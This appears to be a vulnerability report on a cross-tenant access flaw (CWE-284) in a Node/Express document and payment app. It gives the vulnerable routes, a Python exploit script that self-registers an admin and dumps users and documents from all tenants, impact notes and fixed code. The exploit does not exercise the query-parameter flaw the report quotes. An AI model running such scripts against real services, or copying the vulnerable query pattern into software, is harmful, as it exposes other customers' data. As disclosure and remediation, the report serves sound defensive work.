# Vulnerability: Multi-Tenant Isolation Bypass

## 1. Vulnerability Name
**CWE-284: Improper Access Control in Multi-Tenant Architecture**

## 2. Location in Code
- **File:** `backend/src/routes/documents.js` (lines 33-40)
- **File:** `backend/src/routes/payment.js` (lines 70-85)

```javascript
// documents.js - Cross-tenant document access via query parameter
router.get('/', auth, async (req, res) => {
    try {
        // VULNERABILITY: Can access other tenant documents via query
        const { tenantId } = req.query;
        const query = tenantId ? { tenantId } : { userId: req.user._id };
        
        const documents = await Document.find(query)
            .populate('userId', 'email profile')
            .sort({ createdAt: -1 });
        
        res.json(documents);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// payment.js - Cross-user payment history access
router.get('/history', auth, async (req, res) => {
    // VULNERABILITY: Can access any user's payment history via query
    const userId = req.query.userId || req.user._id;
    
    const user = await User.findById(userId);
    res.json({
        paymentHistory: user.paymentHistory || []
    });
});
```

## 3. Technical Root Cause
The multi-tenant architecture lacks proper tenant isolation controls. Database queries don't filter by tenant ID, allowing users to access data across tenant boundaries. Admin users can access and modify data from all tenants rather than being restricted to their own tenant.

## 4. Proof of Concept Explanation
1. Create users in different tenants (tenant1, tenant2)
2. Login as admin user in tenant1
3. Access admin endpoints to view users from all tenants
4. Modify or access resources belonging to tenant2
5. Demonstrate complete tenant isolation bypass

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests
import json

def exploit_tenant_isolation():
    base_url = "http://localhost:5000"
    
    # Register users in different tenants
    tenant1_user = {
        "name": "Tenant1 User",
        "email": "user1@tenant1.com",
        "password": "password123",
        "tenantId": "tenant1",
        "role": "admin"
    }
    
    tenant2_user = {
        "name": "Tenant2 User", 
        "email": "user2@tenant2.com",
        "password": "password123",
        "tenantId": "tenant2",
        "role": "user"
    }
    
    print("[+] Registering users in different tenants...")
    
    # Register tenant1 admin
    requests.post(f"{base_url}/api/auth/register", json=tenant1_user)
    
    # Register tenant2 user
    requests.post(f"{base_url}/api/auth/register", json=tenant2_user)
    
    # Login as tenant1 admin
    login_response = requests.post(f"{base_url}/api/auth/login", json={
        "email": "user1@tenant1.com",
        "password": "password123"
    })
    
    admin_token = login_response.json().get('token')
    headers = {"Authorization": f"Bearer {admin_token}"}
    
    # Try to access all users (cross-tenant)
    print("\n[+] Testing cross-tenant user access...")
    users_response = requests.get(f"{base_url}/api/admin/users", headers=headers)
    
    if users_response.status_code == 200:
        all_users = users_response.json()
        
        print("[!] TENANT ISOLATION BYPASS CONFIRMED")
        print(f"[+] Admin from tenant1 can see {len(all_users)} users across all tenants:")
        
        for user in all_users:
            print(f"    User: {user.get('email')} | Tenant: {user.get('tenantId')}")
    
    # Test document access across tenants
    print("\n[+] Testing cross-tenant document access...")
    
    # Login as tenant2 user and create document
    tenant2_login = requests.post(f"{base_url}/api/auth/login", json={
        "email": "user2@tenant2.com", 
        "password": "password123"
    })
    
    tenant2_token = tenant2_login.json().get('token')
    tenant2_headers = {"Authorization": f"Bearer {tenant2_token}"}
    
    # Create document as tenant2 user
    doc_data = {"title": "Tenant2 Secret Document", "content": "Confidential data"}
    doc_response = requests.post(f"{base_url}/api/documents", headers=tenant2_headers, json=doc_data)
    
    if doc_response.status_code == 201:
        # Try to access tenant2 document with tenant1 admin token
        all_docs_response = requests.get(f"{base_url}/api/admin/documents", headers=headers)
        
        if all_docs_response.status_code == 200:
            all_documents = all_docs_response.json()
            
            print("[!] CROSS-TENANT DOCUMENT ACCESS CONFIRMED")
            print(f"[+] Tenant1 admin accessed {len(all_documents)} documents from all tenants")
    
    return True

if __name__ == "__main__":
    exploit_tenant_isolation()
```

## 6. Impact
- **Data Breach:** Access to sensitive data across organizational boundaries
- **Privacy Violation:** Exposure of confidential business information
- **Compliance Risk:** Violation of data residency and isolation requirements
- **Business Impact:** Loss of customer trust and competitive advantage

**CVSS Score:** 8.1 (High)

## 7. Fix Recommendation

Implement proper tenant isolation:

```javascript
// Tenant isolation middleware
const enforceTenantIsolation = (req, res, next) => {
    // Ensure all queries include tenant filter
    req.tenantFilter = { tenantId: req.user.tenantId };
    next();
};

// Secure document retrieval with tenant isolation
router.get('/', authenticateToken, enforceTenantIsolation, async (req, res) => {
    try {
        const documents = await Document.find({
            userId: req.user.id,
            tenantId: req.user.tenantId  // Enforce tenant boundary
        });
        res.json(documents);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

// Secure admin access with tenant restrictions
router.get('/users', authenticateToken, enforceTenantIsolation, async (req, res) => {
    try {
        if (req.user.role !== 'admin') {
            return res.status(403).json({ message: 'Access denied' });
        }
        
        // Admin can only see users from their own tenant
        const users = await User.find({ 
            tenantId: req.user.tenantId 
        }).select('-password -resetToken');
        
        res.json(users);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

// Database model with tenant isolation
const documentSchema = new mongoose.Schema({
    title: { type: String, required: true },
    content: String,
    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true },
    tenantId: { type: String, required: true, index: true }, // Always indexed
    createdAt: { type: Date, default: Date.now }
});

// Compound index for efficient tenant queries
documentSchema.index({ tenantId: 1, userId: 1 });

// Pre-save hook to ensure tenant ID is set
documentSchema.pre('save', function(next) {
    if (!this.tenantId) {
        return next(new Error('Tenant ID is required'));
    }
    next();
});

// Query middleware to automatically filter by tenant
documentSchema.pre(/^find/, function(next) {
    if (!this.getQuery().tenantId) {
        return next(new Error('Tenant isolation required'));
    }
    next();
});
```